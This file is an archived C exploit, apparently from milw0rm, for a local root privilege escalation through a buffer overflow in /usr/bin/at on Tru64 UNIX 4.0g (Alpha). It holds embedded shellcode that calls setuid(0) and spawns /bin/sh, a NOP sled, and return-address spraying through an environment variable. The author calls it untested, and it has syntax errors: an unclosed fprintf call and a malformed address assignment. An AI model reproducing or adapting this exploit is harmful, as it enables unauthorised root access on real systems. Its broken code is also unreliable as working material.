/*
 * Tru64 UNIX 4.0g (JAVA) (/usr/bin/at) local root exploit. [ALPHA]
 *
 * Author: Cody Tubbs (loophole of hhp).
 * Site:   www.hhp-programming.net
 * Email:  pigspigs@yahoo.com
 * Date:   2/1/2000.
 *
 * I made this without access to gdb, It's untested...
 * may require modification, may require deletion, heh.
 *
 * Note: executable_stack must be on.
 */

#include <stdio.h>
#include <string.h>

#define OFFSET 0
#define ALLIGN 0
#define NOP    "\x1f\x04\xff\x47"
#define DBUF   8000 // 5604+4+528? Manipulate if needed.

char shellcode[]= // Alpha setuid(0);+ execl("/bin/sh","sh",0);
 "\x30\x15\xd9\x43\x11\x74\xf0\x47\x12\x14\x02\x42\xfc\xff\x32"
 "\xb2\x12\x94\x09\x42\xfc\xff\x32\xb2\xff\x47\x3f\x26\x1f\x04"
 "\x31\x22\xfc\xff\x30\xb2\xf7\xff\x1f\xd2\x10\x04\xff\x47\x11"
 "\x14\xe3\x43\x20\x35\x20\x42\xff\xff\xff\xff"
 "\x30\x15\xd9\x43\x31\x15\xd8\x43\x12\x04\xff\x47\x40\xff\x1e"
 "\xb6\x48\xff\xfe\xb7\x98\xff\x7f\x26\xd0\x8c\x73\x22\x13\x05"
 "\xf3\x47\x3c\xff\x7e\xb2\x69\x6e\x7f\x26\x2f\x62\x73\x22\x38"
 "\xff\x7e\xb2\x13\x94\xe7\x43\x20\x35\x60\x42\xff\xff\xff\xff";
 //Taeho Oh shellcode.

//long get_sp(void){ __asm__("bis $31,$30,$0");}

void usage(char *arg) {
  fprintf(stderr, "\nTru64 UNIX 4.0g (JAVA) (/usr/bin/at)");
  fprintf(stderr, " local root exploit. [ALPHA] \n";
  fprintf(stderr, "Author: Cody Tubbs (loophole of hhp)\n\n");
  fprintf(stderr, "Usage: %s <offset> [allign(0..3)]\n", arg);
  fprintf(stderr, "Examp: %s 0\n", arg);
  fprintf(stderr, "Examp: %s 0 1\n", arg);
  exit(1);
}

main(int argc, char **argv){
 char eipeip[DBUF], buffer[4096], heh[DBUF+1];
 char *nop;
 int i, offset, allign;
 long address;

 if(argc < 2){
  usage(argv[0]);
 }

 if(argc>1){offset=atoi(argv[1]);}else{offset=OFFSET;}
 if(argc>2){allign=atoi(argv[2]);}else{allign=ALLIGN;}

//address = get_sp() - offset;
address = i& - offset;

 if(allign>0){for(i=0;i<DBUF;i++){eipeip[i]=0x69;}}
 for(i=allign;i<DBUF;i+=4){*(long *)&eipeip[i]=address;}

 nop=NOP;

 for(i=0;i<(4096-strlen(shellcode)-strlen(eipeip));i++){
  //buffer[i]=nop[i%4];
  buffer[i]   = 0x1f;
  buffer[++i] = 0x04;
  buffer[++i] = 0xff;
  buffer[++i] = 0x47;
 }

 memcpy(buffer+i,shellcode,strlen(shellcode));
 memcpy(buffer,"ATEX=",5); 
 putenv(buffer);

 fprintf(stderr,"Return address %#x, offset: %d.\n",address,offset);
 execlp("/usr/bin/at","at", eipeip, 0);
}


// milw0rm.com [2001-03-02]
